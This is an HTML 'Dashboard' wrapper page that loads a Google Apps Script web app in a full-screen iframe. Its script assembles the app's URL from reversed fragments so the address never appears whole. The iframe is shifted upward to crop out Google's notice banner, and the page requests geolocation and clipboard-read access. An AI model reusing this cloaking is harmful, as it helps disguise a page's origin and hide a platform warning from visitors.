<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#f5f7fb">
<title>Dashboard</title>
<style>
  :root {
    /* ⚠️ अगर banner अभी भी ऊपर दिखे तो 60px बढ़ाएं (70px, 80px) */
    /* अगर admin panel का ऊपरी हिस्सा कट रहा हो तो 60px घटाएं (50px, 45px) */
    --banner-offset: 60px;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #f5f7fb;
  }

  #appShell {
    position: fixed;
    inset: 0;
    overflow: hidden;
    background: #f5f7fb;
  }

  #appFrame {
    position: absolute;
    top: calc(-1 * var(--banner-offset));
    left: 0;
    width: 100%;
    height: calc(100% + var(--banner-offset));
    border: 0;
    display: block;
    background: #f5f7fb;
    color-scheme: light;
  }

  /* Loading overlay */
  #loader {
    position: fixed;
    inset: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    background: #f5f7fb;
    z-index: 9999;
    opacity: 1;
    transition: opacity 0.35s ease;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    color: #64748b;
    font-size: 14px;
    font-weight: 500;
  }
  #loader.hide { opacity: 0; pointer-events: none; }

  .ring {
    width: 42px;
    height: 42px;
    border: 3px solid #e2e8f0;
    border-top-color: #5b8dff;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div id="appShell">
  <iframe
    id="appFrame"
    title="Dashboard"
    allow="geolocation; clipboard-read; clipboard-write"
    referrerpolicy="no-referrer"
  ></iframe>
</div>

<div id="loader">
  <div class="ring"></div>
  <span>Loading…</span>
</div>

<script>
(function () {
  'use strict';

  /* ─────────────────────────────────────────────
     Endpoint assembled at runtime (chunks in
     reverse order, joined back to front).
     → কোথাও পুরा URL direct
     ───────────────────────────────────────────── */
  var _segments = [
    'xNJQ/exec',
    'K1mmkYNkdJrkUSdc',
    'fUgzmOXb3J8ZM52',
    'FtA_DAnMuwfCinV',
    '1gM09yE3MwFk_R',
    'os/s/AKfycbyOjt',
    'google.com/macr',
    'https://script.'
  ];
  var _target = '';
  for (var _i = _segments.length - 1; _i >= 0; _i--) _target += _segments[_i];

  var frame = document.getElementById('appFrame');
  var loader = document.getElementById('loader');
  var dismissed = false;

  function dismissLoader() {
    if (dismissed) return;
    dismissed = true;
    loader.classList.add('hide');
    setTimeout(function () { loader.style.display = 'none'; }, 400);
  }

  /* Loader hide करो जब iframe ready हो */
  frame.addEventListener('load', function () {
    setTimeout(dismissLoader, 200);
  });

  /* Safety net — 5s बाद भी hide करो */
  setTimeout(dismissLoader, 5000);

  /* Set iframe source */
  try {
    frame.src = _target;
  } catch (e) {
    dismissLoader();
  }
})();
</script>

</body>
</html>
